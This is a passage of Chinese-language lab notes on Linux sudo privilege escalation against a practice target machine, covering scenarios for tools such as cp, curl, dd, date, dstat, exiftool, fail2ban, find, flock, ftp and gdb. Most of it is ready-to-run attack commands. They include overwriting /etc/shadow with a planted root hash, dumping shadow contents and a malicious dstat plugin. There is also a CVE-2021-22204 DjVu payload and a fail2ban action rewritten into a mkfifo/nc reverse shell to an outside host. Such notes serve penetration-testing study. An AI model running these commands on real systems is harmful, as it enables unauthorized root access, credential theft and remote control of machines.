![image.png](https://cdn.nlark.com/yuque/0/2023/png/22657583/1685595211619-07d60c3b-cfd5-4ec7-b56d-5663ad6c230e.png#averageHue=%23626368&clientId=udc675dd6-1ea4-4&from=paste&height=67&id=u874562a1&originHeight=84&originWidth=559&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=19189&status=done&style=none&taskId=u125bb8e0-ffa0-4a7d-9d0c-70479818642&title=&width=447.2)

1. 先在本地创建一个 **SHA-512** 密码
```bash
mkpasswd -m sha-512 kali
```
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22657583/1685595367206-e9c035cb-e59a-4737-a71b-2ec477ed5aeb.png#averageHue=%23585b61&clientId=udc675dd6-1ea4-4&from=paste&height=90&id=ue2a688b3&originHeight=113&originWidth=1466&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=61260&status=done&style=none&taskId=u490fd264-7b4d-40e7-a8db-90e190d420a&title=&width=1172.8)

2. 拼接为 **/etc/shadow **文件的格式

![image.png](https://cdn.nlark.com/yuque/0/2023/png/22657583/1685595538725-9c24ab9b-56cf-48fd-84d3-1abf3b8e327c.png#averageHue=%2353565c&clientId=udc675dd6-1ea4-4&from=paste&height=118&id=u78977851&originHeight=147&originWidth=1786&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=97666&status=done&style=none&taskId=u678f0233-d40c-46e2-adf0-36c237d8f1a&title=&width=1428.8)

3. 写入 靶机的 临时文件中 `**$(mktemp)**`，再用 **copy **复制，覆盖写入 **/etc/shadow **文件，以实现提权
```bash
GTC_FILE=/etc/shadow  # 要覆盖写入的文件

temp=$(mktemp)  # mktemp 创建临时文件 在 /tmp 目录中

echo '[root password]' > $temp # root 密码写入临时文件

sudo /bin/cp $temp $GTC_FILE
# 注意覆盖写入，执行前应对 /etc/shadow 备份，以防提权后靶机崩溃
```
提权成功！！！
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22657583/1685596336657-240a0ba0-1b90-498e-8991-91aac80cd1e0.png#averageHue=%232c313e&clientId=udc675dd6-1ea4-4&from=paste&height=421&id=uae342f24&originHeight=526&originWidth=908&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=336300&status=done&style=none&taskId=u3181ed49-2d43-432a-92e8-f6f8da3dbdc&title=&width=726.4)
## 情景十九 - cpulimit
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22657583/1685598359605-55ac0a37-9f63-4483-8b8b-0675c2c100e6.png#averageHue=%23373941&clientId=ucada80b3-aeb4-4&from=paste&height=78&id=uabd8976c&originHeight=98&originWidth=414&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=57874&status=done&style=none&taskId=ud6645b45-eef8-4237-bfca-0f86288fd0f&title=&width=331.2)
```bash
sudo cpulimit -l 100 -f /bin/bash

# -l 100：限制 cpu 的使用率为 100%

# -f /bin/bash：指定 /bin/bash 在前台执行；
#  以 -l 的参数 (100%) 使用 cpu 的比例
```
提权成功！！！
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22657583/1685613666245-a876a099-22c3-4ac2-89b2-93e20dfb109d.png#averageHue=%2321232e&clientId=ucada80b3-aeb4-4&from=paste&height=184&id=ud24fe524&originHeight=230&originWidth=716&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=137003&status=done&style=none&taskId=uae271e5c-f8e0-4401-8767-2654b8e89cd&title=&width=572.8)
## 情景二十 - curl - wget
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22657583/1685602413060-4b2885d4-d61f-4896-b748-80fc7143fe94.png#averageHue=%2320283c&clientId=ucada80b3-aeb4-4&from=paste&height=160&id=u4b62d4b9&originHeight=200&originWidth=735&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=131493&status=done&style=none&taskId=uad73cc8e-f8dc-4a07-bdaa-d773f24af3f&title=&width=588)
通过**HTTP**下载自定义的 **/etc/shadow **来覆盖靶机原本的 **/etc/shadow **，实现提权

1. 先在本地创建一个 **SHA-512** 密码
```bash
mkpasswd -m sha-512 kali
```
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22657583/1685595367206-e9c035cb-e59a-4737-a71b-2ec477ed5aeb.png#averageHue=%23585b61&clientId=udc675dd6-1ea4-4&from=paste&height=90&id=INRLi&originHeight=113&originWidth=1466&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=61260&status=done&style=none&taskId=u490fd264-7b4d-40e7-a8db-90e190d420a&title=&width=1172.8)

2. 拼接为 **/etc/shadow **文件的格式

![image.png](https://cdn.nlark.com/yuque/0/2023/png/22657583/1685595538725-9c24ab9b-56cf-48fd-84d3-1abf3b8e327c.png#averageHue=%2353565c&clientId=udc675dd6-1ea4-4&from=paste&height=118&id=MtUek&originHeight=147&originWidth=1786&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=97666&status=done&style=none&taskId=u678f0233-d40c-46e2-adf0-36c237d8f1a&title=&width=1428.8)

3. 存入 **shadow_evil** 文件中

![image.png](https://cdn.nlark.com/yuque/0/2023/png/22657583/1685602738928-5628ff4f-f004-4804-89e9-533cf34667b3.png#averageHue=%23333641&clientId=ucada80b3-aeb4-4&from=paste&height=208&id=u84f67778&originHeight=260&originWidth=1195&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=166667&status=done&style=none&taskId=u032b57dd-9e1e-4972-bad1-2226081900e&title=&width=956)

4. **curl** 下载 覆盖  **/etc/shadow**
```bash
sudo curl http://192.168.65.130/shadow_evil -o /etc/shadow 

# 注意覆盖写入，执行前应对 /etc/shadow 备份，以防提权后靶机崩溃

# -o 写入文件，不是标准输出
# -O 将输出写入名为远程文件的文件
```
提权成功！！！
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22657583/1685619336563-580be3e6-61e8-428f-94ae-97fab3bb8208.png#averageHue=%23222434&clientId=ucada80b3-aeb4-4&from=paste&height=288&id=u83276776&originHeight=360&originWidth=1061&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=278570&status=done&style=none&taskId=ua14cfacb-4228-4251-aad0-7613737c813&title=&width=848.8)
## 情景二十一 - date
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22657583/1685603411948-8c41dc97-1965-427f-a1a3-d0833646c25e.png#averageHue=%23474951&clientId=ucada80b3-aeb4-4&from=paste&height=148&id=u5bc93960&originHeight=185&originWidth=613&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=46535&status=done&style=none&taskId=u3751de0f-be3c-481f-a982-dbbc34df308&title=&width=490.4)
```bash
sudo date -f /etc/shadow

# -f 让 date 解析指定文件，输出日期
# 这里会报错，报错会输出 /etc/shadow 内容
```
泄露 **/etc/shadow** 信息
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22657583/1685603859277-0bd81b3a-636e-4844-a205-2761cb0d8edd.png#averageHue=%232e3240&clientId=ucada80b3-aeb4-4&from=paste&height=333&id=u070936e4&originHeight=416&originWidth=1300&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=346572&status=done&style=none&taskId=uf25a38d1-6511-4d88-b7fc-9e754dc1d0a&title=&width=1040)
这样就可以** john** 爆破出 **root** 密码以实现提权。
## 情景二十二 - dd
dd - data duplicate 一个简单的数据复制工具。
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22657583/1685607773406-d10b64d3-66e4-4793-8894-3f5c03a70eee.png#averageHue=%23636469&clientId=ucada80b3-aeb4-4&from=paste&height=69&id=u822a5a17&originHeight=86&originWidth=424&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=15952&status=done&style=none&taskId=u3cc226a9-dd8f-4ae0-8bf2-01cb7a5a6b6&title=&width=339.2)

1. 先在本地创建一个 **SHA-512** 密码
```bash
mkpasswd -m sha-512 kali
```
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22657583/1685595367206-e9c035cb-e59a-4737-a71b-2ec477ed5aeb.png#averageHue=%23585b61&clientId=udc675dd6-1ea4-4&from=paste&height=90&id=tSafL&originHeight=113&originWidth=1466&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=61260&status=done&style=none&taskId=u490fd264-7b4d-40e7-a8db-90e190d420a&title=&width=1172.8)

2. 拼接为 **/etc/shadow **文件的格式

![image.png](https://cdn.nlark.com/yuque/0/2023/png/22657583/1685595538725-9c24ab9b-56cf-48fd-84d3-1abf3b8e327c.png#averageHue=%2353565c&clientId=udc675dd6-1ea4-4&from=paste&height=118&id=oiN4l&originHeight=147&originWidth=1786&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=97666&status=done&style=none&taskId=u678f0233-d40c-46e2-adf0-36c237d8f1a&title=&width=1428.8)

3. 执行 数据  覆盖  **/etc/shadow**
```bash
echo '[root:root_pass]' | sudo dd of=/etc/shadow
# of=/etc/shadow
# of - out file 输出到文件

# 注意覆盖写入，执行前应对 /etc/shadow 备份，以防提权后靶机崩溃
```
提权成功！！！
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22657583/1685608365697-6d3c565f-61f4-4726-a215-ead3a40cff9c.png#averageHue=%23363941&clientId=ucada80b3-aeb4-4&from=paste&height=382&id=ub7eff6ad&originHeight=478&originWidth=1115&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=165815&status=done&style=none&taskId=uad3c66fa-ad5b-4d5c-b0ee-90588a9937f&title=&width=892)
## 情景二十三 - dstat
用于生成系统资源统计信息的多功能工具
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22657583/1685613974648-735f170f-d24a-4ad3-804c-72b337d69ed8.png#averageHue=%231f2434&clientId=ucada80b3-aeb4-4&from=paste&height=162&id=u79710760&originHeight=203&originWidth=909&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=162909&status=done&style=none&taskId=u6a3a35e4-7e4f-4b15-94f5-be0f1e5e937&title=&width=727.2)
可以无密码以 **root** 权限执行 **dstat**
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22657583/1685619741240-43d2114a-a7dc-467c-8ac1-75e13a0ed339.png#averageHue=%23292b37&clientId=ucada80b3-aeb4-4&from=paste&height=64&id=u9214d969&originHeight=80&originWidth=463&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=39843&status=done&style=none&taskId=u70d021c6-410a-40cc-add0-1903b727747&title=&width=370.4)

-  `**--<plugin-name>**`这个参数，使用外部的插件，**可以通过自定义外部的插件提权。**
- `**--list**`** **展示可利用的 插件

![image.png](https://cdn.nlark.com/yuque/0/2023/png/22657583/1685628040348-1617574e-81b5-4439-b742-f9eee2dbef11.png#averageHue=%231c1f2c&clientId=ucada80b3-aeb4-4&from=paste&height=110&id=uf8fad2a2&originHeight=137&originWidth=1018&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=58677&status=done&style=none&taskId=u3ac29ec9-6c2c-49b8-ba8b-33c867ead50&title=&width=814.4)
```bash
dstat --list   # 展示可利用的 插件
```
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22657583/1685628428947-42023e54-5537-49b5-8383-237c5ad08a27.png#averageHue=%23252836&clientId=ucada80b3-aeb4-4&from=paste&height=250&id=u34fb5206&originHeight=312&originWidth=927&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=232177&status=done&style=none&taskId=ub6440734-ef0b-4f48-89f0-3519d4ae459&title=&width=741.6)
```bash
find / -name '*dstat*' -type d 2> /dev/null
```
找到了 定义插件的目录 **/usr/share/dstat**
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22657583/1685628756880-8a2f85cd-98bd-48c4-a280-ec694e55e1d2.png#averageHue=%23262938&clientId=ucada80b3-aeb4-4&from=paste&height=449&id=u43d99263&originHeight=561&originWidth=1401&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=701206&status=done&style=none&taskId=uff6e4680-d456-4684-8d7e-0e14de1073b&title=&width=1120.8) 利用条件：同时还需允许该用户在  **/usr/share/dstat **目录下可写
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22657583/1685630507142-7f02adb8-0313-4374-ab9c-1a6db8a8b749.png#averageHue=%23242632&clientId=u5826a877-a3c8-4&from=paste&height=90&id=u326bc9d6&originHeight=113&originWidth=723&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=75945&status=done&style=none&taskId=ufef21549-696e-4561-91d0-95092d07f9e&title=&width=578.4)
**'dstat_'** 是前缀，后面是插件名称：使用 `**--插件名**` 加载插件。
自定义一个提权插件，加载提权
```python
import os

# 第一个参数：字符串，表示你想要执行程序的路径
# 第二个参数：不定长列表，列表里只能包含字符串，表示你想要执行程序的system argument参数。
os.execv('/bin/bash',['bash']) 
```
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22657583/1685630629056-d7c6c598-f2a4-46c7-bf4c-ed1f96d359d6.png#averageHue=%231c1e2b&clientId=u5826a877-a3c8-4&from=paste&height=112&id=ud98f0f82&originHeight=140&originWidth=459&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=36760&status=done&style=none&taskId=u3367c7e0-f0c4-4938-9fc9-57d0425e44a&title=&width=367.2)
最后** sudo** 执行 **dstat** 并加载自定义插件 **dstat_shell.py**
```bash
sudo dstat --shell
```
提权成功！！！
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22657583/1685630760093-e77e0c60-b121-418b-9b42-b50d19834908.png#averageHue=%2321232f&clientId=u5826a877-a3c8-4&from=paste&height=236&id=u0945c0dc&originHeight=295&originWidth=603&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=123394&status=done&style=none&taskId=ua32d2356-405a-4bd5-b1bd-f76558ad3b5&title=&width=482.4)
## 情景二十四 - ed
linux 的 一种简易编辑器工具 edit
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22657583/1685630820200-e3b77144-8ad0-44c4-a670-1255537fdf39.png#averageHue=%23282a36&clientId=u5826a877-a3c8-4&from=paste&height=59&id=u9474aff9&originHeight=74&originWidth=488&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=37193&status=done&style=none&taskId=u0cb22879-14e5-404d-8d76-3ea3345fae5&title=&width=390.4)
```bash
sudo ed  # 进入 文字编辑 界面 ， 按 q 退出

!/bin/bash
# ! 说明指定操作系统自身的命令，而不是ftp命令
```
提权成功！！！
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22657583/1685631135487-a8f25f37-e31f-4b7c-ba52-42aa316b0f75.png#averageHue=%231e202c&clientId=u5826a877-a3c8-4&from=paste&height=288&id=u16a7aefb&originHeight=360&originWidth=555&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=134985&status=done&style=none&taskId=u84ff7ac9-476f-43b5-8696-4d7fe5d0333&title=&width=444)
## 情景二十五 - env
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22657583/1685609449723-c4482f9d-f00a-4655-acdd-d5313031df1b.png#averageHue=%235f6065&clientId=ucada80b3-aeb4-4&from=paste&height=67&id=ud7c475b2&originHeight=84&originWidth=538&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=15411&status=done&style=none&taskId=ue8847eef-1a5d-4999-8474-ccc9047367d&title=&width=430.4)
```bash
sudo env /bin/bash   # env 在指定环境下执行 /bin/bash
```
提权成功！！！
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22657583/1685609495403-f40b3e44-b130-4232-9a0d-54d18b3576a0.png#averageHue=%235b5d63&clientId=ucada80b3-aeb4-4&from=paste&height=147&id=u375bb0d3&originHeight=184&originWidth=585&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=36730&status=done&style=none&taskId=u7ee3de7b-b133-4417-be41-e3c6e8c784d&title=&width=468)
## 情景二十六 - exiftool - 难点
 exiftool - 查看图片的元数据信息 版本在 **7.44-12.23 **有对应的漏洞
```bash
exiftool -ver # 查看工具版本
```
在可提权的漏洞版本区间内
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22657583/1686124442627-6927469b-c0d4-47bb-a08a-1c3840c5472c.png#averageHue=%231d1f2a&clientId=u11b39549-1d7e-4&from=paste&height=76&id=u652f6552&originHeight=95&originWidth=509&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=38008&status=done&style=none&taskId=u15c271e7-e7af-4aef-8005-1246319dd29&title=&width=407.2)
CVE 2021-22204
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22657583/1685630833367-5a1ce1b3-c09c-4ede-8486-57cd2999931b.png#averageHue=%23262834&clientId=u5826a877-a3c8-4&from=paste&height=46&id=u1b93f422&originHeight=57&originWidth=509&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=26617&status=done&style=none&taskId=ue1856cf9-0cdc-4d0d-9708-923e54ec518&title=&width=407.2)
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22657583/1685631716858-512f3839-1e6e-421a-b69b-2cb06654acbf.png#averageHue=%231e2030&clientId=u5826a877-a3c8-4&from=paste&height=189&id=u9d36cedc&originHeight=236&originWidth=1515&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=216765&status=done&style=none&taskId=uc9018015-bac3-4877-9b15-0c173762574&title=&width=1212)

1. 写入 提权 **payload**
```
(metadata "\c${system('/bin/bash')};")
```

2. **bzz** 压缩 成 **bzz** 文件
```bash
bzz payload paylaod.bzz
```
**BZZ** 是一种文件压缩格式，**它提供了高压缩比和快速解压缩速度**。**BZZ压缩算法**是由ProgramBZZ开发的，该算法使用了多种技术，如**自适应字典压缩和预测编码**，以实现更高效的压缩。BZZ文件通常**具有较小的文件大小，可以节省存储空间，并且在解压缩时不会对文件的完整性产生影响。**BZZ格式在特定的 应用场景中可以提供优于其他压缩格式的性能。

3. **djvumake** 生成 **djvu** 文件 - 图像压缩文件
```bash
djvumake exploit.djvu INFO='1,1' BGjp=/dev/null ANTz=payload.bzz
# INFO='1,1' 指定生成 1x1 像素的图像
#  BGjp=/dev/null 设置图片背景 ,这里生成图片无背景
# ANTz=payload.bzz 设置图片的有效载荷，这里是准备好的 shell

# 这个命令的意思是创建一个名为 "exploit.djvu" 的文件
# 该文件可能包含一个非常小的图像（1x1像素），没有背景图像，
# 以及一个指定为 "payload.bzz" 的文件作为有效载荷
```
**DjVuMake**是用于创建和转换**DjVu**文件的工具。**DjVu**是一种图像压缩文件格式，主要用于扫描文档和电子书。与其他图像格式相比，**DjVu **可以提供更高的压缩比，同时保持较好的图像质量。**DjVuMake **工具可以将图像、文本和其他 数据转换为DjVu格式，并且可以进行一些优化和配置，以满足特定需求。**DjVu **文件通常用于在网络上共享**大型扫描文档**，以便更快地加载和浏览。

4. **exiftool** 提权
```
sudo exiftool exploit.djvu	
```
## 情景二十七 - expect
expect 能够模拟用户的键盘输入，可以自动化用户需要交互的过程
用于脚本自动化环境中
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22657583/1685630843493-2e30daf1-1fc0-4677-b02d-7019b9088757.png#averageHue=%23262834&clientId=u5826a877-a3c8-4&from=paste&height=60&id=uf607692e&originHeight=68&originWidth=614&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=38315&status=done&style=none&taskId=u103b7c3b-af0e-4a6d-a393-73c2763977e&title=&width=542.2000122070312)
```bash
sudo /usr/bin/expect -c 'spawn /bin/bash;interact'

# -c 后接 expect 命令字符串
```
提权成功！！！
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22657583/1685635209922-b65b1e0a-df6b-4fe6-9053-5c0c46c5829e.png#averageHue=%23232634&clientId=u5826a877-a3c8-4&from=paste&height=188&id=ub64b1062&originHeight=235&originWidth=705&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=136938&status=done&style=none&taskId=uaa50321a-272c-44f5-b195-b91d99a15e5&title=&width=564)
## 情景二十八 - fail2ban（ssh） - 难点
**Fail2Ban** 是**一个开源的入侵防范软件**，用于在** Linux** 服务器上防止未经授权的访问尝试。它通过监控日志文件，如系统日志和服务日志，动态地阻止显示出可疑或恶意行为的 **IP **地址。例如多次登录失败，或者在规定的时间内超过登录失败次数，IP会被封禁一段时间。可以防止SSH 暴力破解。
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22657583/1685630853006-e362db1d-669e-47ff-9d50-f4884b9e7e21.png#averageHue=%232c2e3b&clientId=u5826a877-a3c8-4&from=paste&height=33&id=u337c29ca&originHeight=41&originWidth=566&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=24222&status=done&style=none&taskId=uc4eb9960-d76c-479c-a5c7-ea9a86ff8c2&title=&width=452.8)
```bash
find / -name '*fail2ban*' -type d 2> /dev/null
```
与 **fail2ban** 相关的配置目录
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22657583/1685669898750-1a4df348-62a9-4486-b784-d98ddb1beba3.png#averageHue=%23232534&clientId=ub357bfca-ed9d-4&from=paste&height=218&id=u681e8ad2&originHeight=273&originWidth=853&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=197714&status=done&style=none&taskId=u7ee06063-13b5-45c1-8242-1e9ccb0d49f&title=&width=682.4)
**fail2ban** 的配置文件：**/etc/fail2ban/jail.conf**
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22657583/1685671353144-e106de06-af98-4cf2-a747-25a0a9fa23ea.png#averageHue=%23262939&clientId=ub357bfca-ed9d-4&from=paste&height=228&id=uef3b0e54&originHeight=285&originWidth=318&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=89214&status=done&style=none&taskId=udaa8f8be-a0a8-430f-bb5f-1da4e813001&title=&width=254.4)
**意思是在 10s 内，如果登陆失败 5次，IP 就会被封禁 10s**
利用条件：**/etc/fail2ban/action.d **目录可写
```bash
find /etc -writable -type d 2> /dev/null
```
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22657583/1685670574897-865bf908-a119-4a7e-acc5-06cffebc0a24.png#averageHue=%23242632&clientId=ub357bfca-ed9d-4&from=paste&height=62&id=u1c3cd09b&originHeight=78&originWidth=602&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=44875&status=done&style=none&taskId=u9c0a98df-2564-4c3f-b830-307b38c4922&title=&width=481.6)
该目录下定义了，**IP** 被封禁后执行的行为相关脚本。可以在这里自定义恶意脚本，实现提权。
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22657583/1685671583904-f1db6e86-f461-4da3-a609-9e50cfdfbb1d.png#averageHue=%232d3140&clientId=ub357bfca-ed9d-4&from=paste&height=210&id=u9220740d&originHeight=263&originWidth=437&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=135213&status=done&style=none&taskId=u63fafc67-2bb4-4455-bea3-a690afa4c23&title=&width=349.6)
**iptables-multiport.conf **规定了，短时间内尝试登陆失败，IP被封禁后所执行的行为。
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22657583/1685672265369-c7c4ef40-b3a2-409a-8c7d-096c8ae8a250.png#averageHue=%23232533&clientId=ub357bfca-ed9d-4&from=paste&height=63&id=u17c96ed9&originHeight=79&originWidth=943&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=56133&status=done&style=none&taskId=u9d0d02f5-cd7b-406f-ba71-93af2c462d2&title=&width=754.4)
该文件目前尚不可写，但由于该文件所处的目录可写，可利用 **mv, cp **命令更改该文件的属主，使之可写
```bash
mv iptables-multiport.conf iptables-multiport.conf.bak
# 只移动文件，不创建新文件，所以属主 是 root

cp iptables-multiport.conf.bak iptables-multiport.conf
# 创建新文件副本，写入文件，属主变成创建该命令的用户	
```
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22657583/1685672575069-dbc1abff-c252-47fd-9c99-be5a0b8473f1.png#averageHue=%23252636&clientId=ub357bfca-ed9d-4&from=paste&height=281&id=uc6166ff3&originHeight=351&originWidth=1034&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=310748&status=done&style=none&taskId=u5c42ca38-9ff7-4ab8-b27e-7942e1517ac&title=&width=827.2)
**actionban **定义了被封后所执行的操作，在这里写上提权语句
```bash
rm /tmp/pipe;
mkfifo /tmp/pipe;
cat /tmp/pipe | bash -i 2>&1 | nc 192.168.65.130 6666 > /tmp/pipe
```
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22657583/1685673400637-814afad5-7505-4d26-a31e-3138011d50db.png#averageHue=%23212332&clientId=ub357bfca-ed9d-4&from=paste&height=81&id=ucf9d64dd&originHeight=101&originWidth=1083&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=81989&status=done&style=none&taskId=u490c4f6e-5fee-4f1e-981f-c5c3a2e8386&title=&width=866.4)
注意写完后重启服务，使配置生效
```bash
sudo /etc/init.d/fail2ban restart
```
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22657583/1685673869933-7cd9b1d7-2018-496a-818b-c25898b81621.png#averageHue=%23323a4c&clientId=ub357bfca-ed9d-4&from=paste&height=62&id=u5c75a109&originHeight=78&originWidth=800&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=89092&status=done&style=none&taskId=uad3c424b-72c0-4e72-b17a-759d0b1a5ad&title=&width=640)
迅速的多次错误尝试ssh 登录靶机
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22657583/1685673966055-3bebf8e5-a170-42d3-a474-af11ac514a7d.png#averageHue=%23252939&clientId=ub357bfca-ed9d-4&from=paste&height=396&id=u940afbb4&originHeight=495&originWidth=802&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=339388&status=done&style=none&taskId=u66b76c2d-9c3c-4d70-b236-2f00eec51b5&title=&width=641.6)
提权成功！！！
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22657583/1685674035769-74be11cd-22a7-4207-bac9-7e1651833885.png#averageHue=%23292c3c&clientId=ub357bfca-ed9d-4&from=paste&height=329&id=uda8f04bf&originHeight=411&originWidth=741&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=305794&status=done&style=none&taskId=uac50a31c-63d8-4e43-92f3-61eeeb2e184&title=&width=592.8)
但该 shell 是暂时的，过 10s 自动断开。
## 情景二十九 - find
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22657583/1685599767037-67793b9e-44d6-456f-ac9c-9c4c4c28518f.png#averageHue=%232a344a&clientId=ucada80b3-aeb4-4&from=paste&height=65&id=u75206f18&originHeight=81&originWidth=503&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=56490&status=done&style=none&taskId=u184a4e0e-d178-433a-b213-2bb83b3b2b9&title=&width=402.4)
```bash
sudo find . -exec /bin/bash \; -quit

# -exec 后接 linux 命令
# \; 代表 传递给 -exec 参数的命令结束符
# 因为 ; 在系统时代表命令的分割，前面 加 \代表转义。
```
提权成功！！！
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22657583/1685607080784-d93e0558-6652-4f16-aad4-bfe94c127c56.png#averageHue=%2357585e&clientId=ucada80b3-aeb4-4&from=paste&height=183&id=ubc29df04&originHeight=229&originWidth=777&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=47592&status=done&style=none&taskId=u31f370ea-d5d4-4a4b-bae1-a2418f12d85&title=&width=621.6)
## 情景三十 - flock
**flock : file lock**；linux 中管理文件锁定的实用程序，协调多个进程对文件和文件系统的访问。**防止多进程对同一个文件读取修改所产生的问题。**
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22657583/1685608527786-b38482a5-e288-43d3-ae02-389698844a93.png#averageHue=%23606166&clientId=ucada80b3-aeb4-4&from=paste&height=54&id=ubf627811&originHeight=67&originWidth=485&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=13523&status=done&style=none&taskId=uf7b54dea-a120-4537-a025-5e7b31209b1&title=&width=388)
```bash
sudo flock -u / /bin/bash

# -u unlock 
# 意思是 解锁根目录下的所有文件，并交给 /bin/bash 操作
# 因此获得 root 的 shell
```
提权成功！！！
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22657583/1685609360574-e32abfd1-418b-4350-b87e-9cb8fe46da42.png#averageHue=%23232731&clientId=ucada80b3-aeb4-4&from=paste&height=179&id=uc52fff46&originHeight=224&originWidth=667&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=65454&status=done&style=none&taskId=u6813c7b0-6a26-4de8-be8d-28ea2179903&title=&width=533.6)
## 情景三十一 - ftp
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22657583/1685599752877-8c9079d5-ab28-4564-b378-293b2dde5622.png#averageHue=%232e313c&clientId=ucada80b3-aeb4-4&from=paste&height=58&id=ufd6b05cf&originHeight=72&originWidth=536&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=45870&status=done&style=none&taskId=u1c044d5a-fb09-4be7-9b5a-28e84c2f2d2&title=&width=428.8)
```bash
sudo ftp

!/bin/bash
# ! 说明指定操作系统自身的命令，而不是ftp命令
```
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22657583/1685599815003-927e8a6a-e563-4cf2-a4d3-150292201699.png#averageHue=%23585960&clientId=ucada80b3-aeb4-4&from=paste&height=125&id=u9a43165a&originHeight=156&originWidth=472&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=31308&status=done&style=none&taskId=ub3e90885-b6e0-4f91-b2ec-d607e82037a&title=&width=377.6)
## 情景三十二 - gdb (gnu-debugger)
二进制 C，C++ 调试工具
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22657583/1685608544422-54bb29a1-2bb5-4e82-a478-a97d2920afee.png#averageHue=%235f6065&clientId=ucada80b3-aeb4-4&from=paste&height=49&id=ub5a04a55&originHeight=61&originWidth=431&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=10877&status=done&style=none&taskId=ud8356c8d-16d1-4dde-a5f0-0654a3d2f48&title=&width=344.8)
```bash
  sudo gdb -nx -ex '!bash' -ex quit

# -nx no execute 告诉 gdb 执行时不读取任何初始化的配置文件
# -ex execute 执行命令
# '!bash' ！强调执行系统命令 bash ,新启 bash 会话

-ex quit
```
